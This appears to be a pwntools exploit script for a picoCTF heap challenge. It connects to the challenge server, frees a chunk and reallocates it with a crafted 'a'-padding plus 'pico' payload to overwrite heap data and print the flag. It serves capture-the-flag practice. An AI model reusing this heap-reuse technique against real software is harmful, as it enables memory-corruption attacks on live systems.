from pwn import *



elf =context.binary =ELF('./chall')


#p =process()
p =remote('tethys.picoctf.net', 52698)


def alloc(size,data):
	p.sendline(b'2')
	p.sendlineafter(b'allocation:',str(size).encode())
	p.sendline(data)
	
	


def free():
	p.sendline(b'5')
	
	
payload=b'a'*30+b'pico'



free()
alloc(31,payload)


p.sendline(b'4')
print(str(p.recvall()).split('!!')[-1][2:-3])


